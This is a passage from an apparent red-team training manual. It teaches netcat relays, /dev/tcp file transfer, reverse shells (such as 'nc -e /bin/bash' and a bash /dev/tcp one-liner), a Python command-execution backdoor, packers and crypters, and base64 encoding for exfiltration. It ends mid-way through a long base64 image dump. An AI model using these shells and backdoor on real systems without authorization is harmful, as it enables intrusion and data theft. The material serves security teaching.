nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```
Blue_Priv_Host-1:
```
nc -lvp 3333 > newsecret.txt
```


---
#### 9.2.2.5 File transfer with /DEV/TCP
/dev/tcp is the system file that interacts directly with the TCP protocol. In some cases, a machine might not have nc installed natively. Since /dev/tcp in one of several device files that support the bash shell, this option may allow you to "live off the land." It can be used by bash to interact directly with the TCP stack. We can use /dev/tcp to create a socket connection to a specific website, internal device, or external device. Simular functionality is also available with /dev/udp.

When a process accesses "/dev/tcp/host/port", the shell creates a TCP connection to the specified host and port.

- Establish a Netcat listener on the Internet Host. The syntax below uses "-l" to establish the listener, "v" to listen verbosely, and "p" to specify port 1111.
```
$ nc -lvp 1111 > devtcpfile.txt
```
- On the sending system use /dev/tcp to send the file by using the cat command.
```
cat secret.txt > /dev/tcp/10.10.0.40/1111
```


---
#### 9.2.2.6 Reverse shells
A reverse shell is a type of shell where the target machine initiates the connection to the attacker’s machine. This can be useful for gaining and maintaining remote access to a system using native tools.


---
##### 9.2.2.6.1 Using Netcat
Now that socket communication and netcat relays are understood, put it all together lets discuss uses beyond file transfer.

Netcat has an option "-e" that allows for the execution of a program on a host. This can be used for creating a shell on a forward compromised host.

In this scenario, we want to obtain shell access to the victim machine. We can use a compromised host to pivot this connection across the network to the attacking host that is listening for the connection. In this scenario we will use a client-listener relay.

- First, establish the listener on the attack machine; in this case the Internet Host. The syntax below uses "-l" to establish the listener, "v" to listen verbosely, and "p" to specify port 9999.
```
$ nc -lvp 9999
```

- Now establish the client connection from the victim machine (in this example, the victim machine is BH1) using the -e command to pass shell acccess.
  - The below command creates the final connection to BH1 at IP 172.16.82.106 on port 9999 (passing through the relay and on to the IH).
  - The -e switch is used to pass the bash shell or to run a script.
  - The -c switch can also be used to pass bash commands.
  - Depending on linux OS, some netcat installations may not have one or either of these options available.
```
$ nc -c /bin/bash 10.10.0.40 9999

$ nc -e /bin/bash 10.10.0.40 9999
```
- Last, we can now return to the listener established on the IH and run commands from the attack machine that will be executed on the victim.
```
$ pwd
$ whoami
$ hostname
$ ip a
```
- One-time use, ports are ephemeral; ctrl+c to close everything down

References:  
https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/  
https://n0where.net/bash-open-tcpudp-sockets  
https://medium.com/100-days-of-linux/7-fundamental-use-cases-of-netcat-866364eb1742


---
##### 9.2.2.6.2 Using /DEV/TCP
- First, establish the listener on the attack machine; in this case the Internet Host. The syntax below uses "-l" to establish the listener, "v" to listen verbosely, and "p" to specify port 9999.
```
$ nc -lvp 9999
```
Passing an interactive bash shell from Blue_Host-1:
```
/bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
```
- `/bin/bash` - This specifies the path to the Bash shell executable.
- `-i` - This option tells Bash to launch in interactive mode. When Bash is run interactively, it reads commands from the terminal and provides features such as command history, command editing, and tab completion. Interactive mode is useful for tasks where direct user input and interaction are required.
- `/dev/tcp/10.10.0.40/9999` - Invokes access to the TCP protocol stack to create a TCP connection to 10.10.0.40 on port 9999.
- `0<&1` - This part of the command redirects file descriptor 0 (standard input) to file descriptor 1 (standard output). In other words, it tells the shell to make standard input (file descriptor 0) a duplicate of standard output (file descriptor 1). This can be useful for scenarios where a command or script expects input from the keyboard but instead receives input from another command’s output.
- `2>&1` - This part of the command redirects file descriptor 2 (standard error) to file descriptor 1 (standard output). It tells the shell to make standard error (file descriptor 2) a duplicate of standard output (file descriptor 1). This allows error messages generated by a command or script to be captured along with regular output, making it easier to manage and analyze error conditions.

---
- Using the previous example, need to update the connections:
```
Box1  S <------ C  Box 2   S <---------------------------------------------------------- C  Box 3
`nc -lvp 4444`     `fifopipe` `nc 10.10.0.40 4444 < fifopipe | nc -lvp 8888 > fifopipe`     `/bin/bash -i > /dev/tcp/192.168.1.1/8888 0<&1 2>&1`
```

References:  
https://tldp.org/LDP/abs/html/devref1.html  
https://www.youtube.com/watch?v=hZ6TjWuepqw  
Sharma, H. S. (2018). HANDS-ON RED TEAM TACTICS: Gather exploitation intelligence, identify risk, and expose …​ vulnerabilities. PACKT Publishing Limited.  
http://techgenix.com/understanding-ftp-protocol/  
https://programmingonfire.com/2017/09/05/backdoors-relays-and-data-transfer-with-netcat/  
https://blog.techorganic.com/2012/10/16/introduction-to-pivoting-part-3-ncat/  


---
##### 9.2.2.6.3 Using Python3
Similar to `nc` but listening port is more persistent; need to ctrl+c on listening side else easy to reconnect on listening port
- Create your file:
```
nano backdoor.py
```
Copy and paste the code below:
```
#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
```
Set the file to be executable:
```
chmod +x backdoor.py
```
Run the program:
```
./backdoor.py
```
Use netcat to connect to the listening port:
```
nc 10.10.0.40 1234
```
Now you can send commands and view the results.


---
## 9.3 Understanding packing and encoding
"Packing" and "encoding" are two concepts commonly used in computer science and data processing, especially when dealing with binary data or data transmission over networks.

Packing involves organizing data into a structured format suitable for storage or transmission. This typically involves converting data values (such as numbers or characters) into a binary representation and arranging them in a specific order according to predefined rules or specifications.

Encoding refers to the process of converting data from one representation to another, often for purposes such as compression, encryption, or ensuring compatibility between systems.


---
### 9.3.1 Packers
Packers refer to tools or programs that are used to encrypt and/or compress executables and eliminate the need for a separate program to execute this function. Packers are designed to modify the format of an executable file while preserving its functionality. There are many uses for packers such as:
- Compression: Packers often compress executable files, reducing their size and making them more compact. This can be useful for software distribution, as smaller files can be downloaded more quickly.
- Obfuscation: Packers can obfuscate the code within an executable, making it more challenging for analysts or reverse engineers to understand the inner workings of the program. This can be a defensive measure against reverse engineering and unauthorized access.
- Anti-Analysis Techniques: Some packers incorporate anti-analysis techniques to detect if the executable is being run within a virtual environment or a debugger. If such conditions are detected, the packed executable may behave differently or refuse to execute.
- Code Encryption: Packers can encrypt portions of the executable’s code, requiring the packer itself to decrypt and execute the code dynamically during runtime. This adds an extra layer of complexity to the analysis process.
- Runtime Decompression: Packed executables typically include a decompression routine that runs before the actual program starts. This routine unpacks the compressed code and data, allowing the program to execute as intended.
- Stealth and Evasion: Malware authors often use packers to make their malicious code less detectable by antivirus or intrusion detection systems. The altered code signature and behavior can help malware evade traditional security measures.

Packer tools play a valid role in software distribution and safeguarding, yet they are frequently exploited by malicious actors to conceal the actual nature of their harmful code. Consequently, security researchers and antivirus programs frequently flag packed executables as potentially suspicious or malicious due to the obfuscation and anti-analysis methods employed.

Security experts and researchers employ diverse tools and methodologies to scrutinize packed executables, gain insights into their functionalities, and pinpoint potential risks. Moreover, the analysis of packers becomes imperative in the examination of malware campaigns, shedding light on the strategies employed by threat actors to elude detection.

Some Types of packers:
- Executable Packers:
  - Purpose: These packers are designed to compress and encrypt standalone executable files (e.g., .exe files).
  - Use Case: Software developers often use executable packers to reduce the size of their applications for distribution. However, malware authors may also use them to obfuscate malicious code.
- Binary Packers:
  - Purpose: Binary packers operate at the binary level, modifying the binary representation of the executable file.
  - Use Case: Used for both legitimate software distribution and malware obfuscation. The packed binary may have a different structure from the original.
- Runtime Packers:
  - Purpose: These packers perform compression and encryption of executable code dynamically during runtime, just before the program is executed.
  - Use Case: Often employed by malware to evade static analysis, as the packed code is only visible in its unpacked form during execution.
- Self-Extracting Packers:
  - Purpose: These packers create self-extracting archives that can unpack and execute the original executable when run.
  - Use Case: Used for software distribution, allowing users to extract and run an application without needing a separate unpacking tool.
- Web Packers (JavaScript Packers):
  - Purpose: Web packers are used to compress and obfuscate JavaScript code in web applications to reduce load times and make it more challenging to reverse engineer.
  - Use Case: Commonly used by web developers to optimize the delivery of JavaScript code on websites.
- Crypters:
  - Purpose: Crypters are a type of packer specifically designed to encrypt and obfuscate malware, making it more difficult for antivirus programs to detect.
  - Use Case: Widely used by malware authors to create polymorphic malware that can change its appearance with each execution.
- PolyPackers (Polymorphic Packers):
  - Purpose: Polymorphic packers change their own code each time they are used, making it more challenging for security tools to create signatures for detection.
  - Use Case: Primarily used by malware to create polymorphic variants that can avoid signature-based detection.
- UPX (Ultimate Packer for eXecutables):
  - Purpose: UPX is a popular open-source executable packer that compresses and decompresses executable files.
  - Use Case: Legitimately used by software developers to reduce file sizes, but also known to be used by malware authors.
- UPX syntax:
```
upx.exe -o <output file> -<0-9> <input file>

 The -<0-9> refers to compression.  0 being no compression and 9 being max compression.  The higher the compression, the smaller the file, but the longer it will take to compress.
```


---
### 9.3.2 Encoding and decoding:
Encoding is the application of specialized formatting to a data set; decoding is just the removal of that formatting to convert the data set back to its original format. These functions are commonly use in the transmission and storage of data. Historically, encoding and decoding was used in email to transmit binary data to systems that normally process text. Sending strickly binary data is not ideal due to the use of null characters, which had often indicated the end of a sequence or transmission. uuencode/uudecode and more commonly, base64 can be use to send and store binary data as text.

Keep in mind that encoding is NOT compression; instead it requires additional space. It is useful for storing webpage images and audio files to reduce network requests and can also be used for data obsfucation. Additionally, encoding is NOT encryption; the data format is changed but can still be intercepted and easily decoded.

Encoding is a valuable technique for offensively or defensively. It works by obfuscating payloads or code, making them more resistant to detection by external entities. It serves as a protective layer, obscuring the true nature of the data or instructions being transmitted or stored. By employing encoding, sensitive information can be concealed from prying eyes, thwarting potential attackers' (or Network analysts) attempts to decipher or intercept it.


---
#### 9.3.2.1 Perform Hexadecimal endcoding and decoding
Hexadecimal encoding converts each byte to the 2-digit base-16 equivalent (preserving leading zeroes). It is inefficient, but it is a simple, commonly-used way to represent binary data in plain text. Four bits displayed as a single character; often used in representing MAC and IP addresses as well as notations for color schemes and other 32 and 64 bit values.

Programmers use Hex encoding to improve readability of bytes while increasing information density. Think of density as the amount of information on a single piece of paper, not in terms of storage space. In terms of storage space, it is rather inefficient, especially when spaces are added to easy readability. If there are concerns with storage space, Base64 may be a better alternative.

**Demonstration - Hex encoding and decoding using xxd:**
- the xxd linux command creates a hex dump of a given file or input. It can also convert a hex dump back to its original binary form.
- echo a string of text and use xxd to convert it to a plain hex dump with the -p switch:
```
$ echo "Hex encoding test" | xxd -p
48657820656e636f64696e6720746573740a
```

- echo hex string and use xxd and the appropriate switches to restore the data to its original format. Use the -r switch to specify "revert to original data" along with the -p switch to specify the input as plain hex dump.
```
$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
Hex encoding test
```

References:  
https://linux.die.net/man/1/xxd


---
#### 9.3.2.2 Perform BASE64 encoding and decoding
Base64 is a method to represent binary data in ASCII format then to a radix-64 format.

Base64 is a group of binary-to-text encoding schemes that represent binary data (sequences of 8 bit bytes) in an ASCII string format by translating the data into a radix-64 representation.
- The term Base64 originates from a specific MIM content transfer encoding.
- each non-final Base64 digit represents exactly 6 bits of data.
- three 8 bit bytes (a total of 24 bits) can therefore be represented by four 6 bit Base64 digits.
- To ensure standardization and proper conversion, padding is used to fill in any unused Base64 digits and complete the 24 bit grouping.
- Base64 is designed to carry all data stored in binary formats across channels that only reliably support text content.
- Base64 is especially prevalent on the WWW and allows the ability to embed images and files in textual assets like HTML and CSS files.
- Base64 is also widely used for sending e-mail attachments. This originated from the requirement of SMTP being designed to transport 7-bit ASCII characters.
- Base64 encoding results in a 33-36% overhead (3% variance due to inserted line breaks)

To encode with base64 the binary bit-stream is divided into 6-bit groupings and each grouping in converted to its corresponding printable character as shown in Figure 2. If the original bit stream is not evenly divisible by 6 the = character is used for padding. To decode with base64 the binary bit-stream is divided back into 8-bit groupings restoring any non-printable bytes.


Figure 1: Base64 Conversion Chart

The chart below depicts the 6 bit character set used in Base64.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/82b0ec31-d69a-4103-9f0b-e5ce5b54acb7)



Figure 2: Base64 Conversion Chart

The chart below shows the conversion of traditional 8 bit ASCII text to 6 bit Base64 and the use of padding to complete the 6-byte grouping.
- The word "Test" is first converted to its 8-bit equivalent.
- The result is then broken into 6-bit groupings and converted to base64 using the below chart.
- Padding is then used to fill in any remaining values to complete the 2nd 24-bit grouping.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/fc2dd4de-2742-4eec-bbd2-ec9f9a3038d8)


Base64 encoding and decoding:

The base64 linux command can be used to encode and decode a file or standard input using the base64 system.
- Base64 syntax to encode a file:
```
base64 myfile.txt
```
Base64 syntax to encode a string text:
```
$ echo "the contents of my file" | base64

dGhlIGNvbnRlbnRzIG9mIG15IGZpbGUK
```
To encode a file and redirect the output to a file:
```
base64 myfile.txt > encoded_file.txt
```
To decode a file:
```
base64 -d encoded_file.txt
```
To decode a string of base64:
```
$ echo "dGhlIGNvbnRlbnRzIG9mIG15IGZpbGUK" | base64 -d

the contents of my file
```


---
#### 9.3.2.3 Conducting file transfers with BASE64
At its most basic level, a file is still just a series of 1’s and 0’s. After converting, the code can be copied and reconstructed on our machine, leaving fewer host and network artifacts. This can be useful when staging tools or exfiltrating data.

**Demonstration - File transfers with Base64**
- From our target machine, convert the file to base64, using -w0 to remove line wrapping:
```
$ base64 -w0 logoCyber.png
```
- Highlight and copy the entire base64 output displayed on the victim machine. This can be lengthy, depending on file size. Our output is as follows:
```
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/GMzLdsAADhqaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzExMSA3OS4xNTgzMjUsIDIwMTUvMDkvMTAtMDE6MTA6MjAgICAgICAgICI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iPgogICAgICAgICA8eG1wOkNyZWF0b3JUb29sPkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChXaW5kb3dzKTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wOkNyZWF0ZURhdGU+MjAxOC0wMi0xMlQxNTozMjoyNS0wNTowMDwveG1wOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4yMDE4LTAyLTEyVDE1OjQ1OjIzLTA1OjAwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAxOC0wMi0xMlQxNTo0NToyMy0wNTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPGRjOmZvcm1hdD5pbWFnZS9wbmc8L2RjOmZvcm1hdD4KICAgICAgICAgPHBob3Rvc2hvcDpDb2xvck1vZGU+MzwvcGhvdG9zaG9wOkNvbG9yTW9kZT4KICAgICAgICAgPHBob3Rvc2hvcDpJQ0NQcm9maWxlPnNSR0IgSUVDNjE5NjYtMi4xPC9waG90b3Nob3A6SUNDUHJvZmlsZT4KICAgICAgICAgPHhtcE1NOkluc3RhbmNlSUQ+eG1wLmlpZDo1ZDA2M2E4Ny1mYzYxLTU2NGEtYWNkYS1hYTk1NDBhMTY4ZWI8L3htcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4bXBNTTpEb2N1bWVudElEPnhtcC5kaWQ6NWQwNjNhODctZmM2MS01NjRhLWFjZGEtYWE5NTQwYTE2OGViPC94bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06T3JpZ2luYWxEb2N1bWVudElEPnhtcC5kaWQ6NWQwNjNhODctZmM2MS01NjRhLWFjZGEtYWE5NTQwYTE2OGViPC94bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpIaXN0b3J5PgogICAgICAgICAgICA8cmRmOlNlcT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+Y3JlYXRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOjVkMDYzYTg3LWZjNjEtNTY0YS1hY2RhLWFhOTU0MGExNjhlYjwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxOC0wMi0xMlQxNTozMjoyNS0wNTowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6WVJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjE8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjE4OTwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4xODU8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICA